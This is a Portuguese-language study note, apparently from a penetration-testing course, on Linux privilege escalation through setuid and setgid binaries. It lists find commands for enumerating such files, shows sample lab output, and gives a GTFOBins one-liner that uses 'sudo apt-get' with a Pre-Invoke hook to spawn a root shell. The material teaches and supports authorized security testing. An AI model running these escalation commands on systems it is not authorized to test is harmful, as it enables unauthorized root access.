A permissão `Set User ID upon Execution`( `setuid`) pode permitir que um usuário execute um programa ou script com as permissões de outro usuário, normalmente com privilégios elevados. O bit `setuid` aparece como um `s`.

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
|
```output
-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs
```

Podemos explorar programas com o bit SETUID definido para encontrar vulnerabilidades e escalar privilégios. O bit SETUID permite que programas sejam executados com os privilégios do proprietário do arquivo, o que pode ser aproveitado para executar comandos com esses privilégios. 

Da mesma forma, a permissão Set-Group-ID (setgid) permite executar binários como se fôssemos parte do grupo que os criou. Para encontrar esses arquivos, podemos usar o comando `find / -uid 0 -perm -6000 -type f 2>/dev/null`. Esses arquivos setgid podem ser usados da mesma forma que os arquivos setuid para escalar privilégios no sistema.

```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
|
```output
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
```

Este recurso tem mais informações sobre os bits setuide setgid, incluindo como configurá-los.

### GTFObins
O projeto GTFOBins é uma lista com curadoria de binários e scripts que podem ser usados por invasores para contornar restrições de segurança. Cada página detalha como os programas podem ser utilizados para sair de shells restritos, escalar privilégios, gerar conexões de shell reverso e transferir arquivos. Por exemplo, o comando ``apt-get`` pode ser usado para sair de ambientes restritos e gerar um shell, adicionando um comando Pre-Invoke :

```shell
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
![[Pasted image 20240719192657.png]]

Vale a pena nos familiarizarmos com o máximo possível de GTFOBins para identificar rapidamente configurações incorretas quando chegamos a um sistema no qual precisamos aumentar nossos privilégios para avançar.



































































































































































































































































